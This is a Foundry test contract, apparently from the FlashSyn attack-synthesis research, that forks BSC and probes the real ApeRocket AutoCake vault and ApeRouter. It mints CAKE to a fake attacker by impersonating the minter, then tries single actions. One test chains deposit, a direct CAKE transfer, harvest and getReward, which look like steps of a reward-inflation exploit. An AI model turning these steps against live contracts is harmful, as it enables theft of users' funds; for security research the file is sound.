// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity >0.7.0;

import "ds-test/test.sol";
import {stdCheats} from "forge-std/stdlib.sol";
import {Vm} from "forge-std/Vm.sol";
import {Strings} from "mylib/StringCon.sol";
import "../interfaces/ApeRocketI.sol";

contract ApeRocket is DSTest, stdCheats {
    Vm public constant vm = Vm(HEVM_ADDRESS);
    address payable attacker;

    ICAKE CAKE = ICAKE(0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82);
    IBEP20 SPACE = IBEP20(0xe486a69E432Fdc29622bF00315f6b34C99b45e80);
    address private AutoCakeAddress = 0x274B5B7868c848Ac690DC9b4011e9e7e29133700;
    address private ApeRouterAddress = 0xC0788A3aD43d79aa53B09c2EaCc313A787d1d607;
    address private WBNBAddress = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
    address private SPACEAddress = 0xe486a69E432Fdc29622bF00315f6b34C99b45e80;

    IBEP20 WBNB = IBEP20(WBNBAddress);
    IAutoCake AutoCake = IAutoCake(AutoCakeAddress);
    IApeRouter ApeRouter = IApeRouter(ApeRouterAddress);

    uint256 temp;
    string str80;
    string str81;
    uint256[] amounts = new uint[](4);
    address[] ad = new address[](2);

    function setUp() public {
        attacker = payable(address(uint160(uint256(keccak256(abi.encodePacked("FakeAttacker"))))));

        vm.startPrank(0x73feaa1eE314F8c655E354234017bE2193C9E24E);
        CAKE.mint(address(attacker), 1615000e18);
        vm.stopPrank();

        vm.startPrank(attacker);
        CAKE.approve(AutoCakeAddress, 2 ** 256 - 1);
        SPACE.approve(ApeRouterAddress, 2 ** 256 - 1);
    }

    function profitSummary() internal returns (string memory _uintAsString) {
        uint256 WBNBBalance = WBNB.balanceOf(address(attacker)) / 1e18;
        uint256 CAKEBalance = CAKE.balanceOf(address(attacker)) / 1e18;
        return Strings.appendWithSpace("FlashSyn: ", Strings.appendWithSpace(WBNBBalance, CAKEBalance));
    }

    function testExample1_() public {
        emit log("=================== Separator ==================");
        // Action: DepositAutoCake
        AutoCake.deposit(1 * 1e18);
        emit log("=================== Separator ==================");
        revert("");
    }

    function testExample2_() public {
        emit log("=================== Separator ==================");
        // Action: TransferCAKE
        CAKE.transfer(AutoCakeAddress, 1 * 1e18);
        emit log("=================== Separator ==================");
        revert("");
    }

    function testExample3_() public {
        emit log("=================== Separator ==================");
        // Action: HarvestAutoCake
        AutoCake.harvest();
        emit log("=================== Separator ==================");
        revert("");
    }

    function testExample4_() public {
        emit log("=================== Separator ==================");
        // Action: GetRewardAutoCake
        AutoCake.getReward();
        emit log("=================== Separator ==================");
        revert("");
    }

    function testExample5_() public {
        emit log("=================== Separator ==================");
        // Action: WithdrawAllAutoCake
        AutoCake.withdrawAll();
        emit log("=================== Separator ==================");
        revert("");
    }

    function testExample6_() public {
        // Action: DepositAutoCake
        AutoCake.deposit(1000 * 1e18);
        // Action: TransferCAKE
        CAKE.transfer(AutoCakeAddress, 100 * 1e18);
        // Action: HarvestAutoCake
        AutoCake.harvest();
        // Action: GetRewardAutoCake
        AutoCake.getReward();

        emit log("=================== Separator ==================");
        // Action: SwapSpace2WBNB
        ad[0] = SPACEAddress;
        ad[1] = WBNBAddress;
        ApeRouter.swapExactTokensForTokens(1 * 1e18, 1, ad, address(attacker), 16263233670);
        emit log("=================== Separator ==================");
        revert("");
    }
}
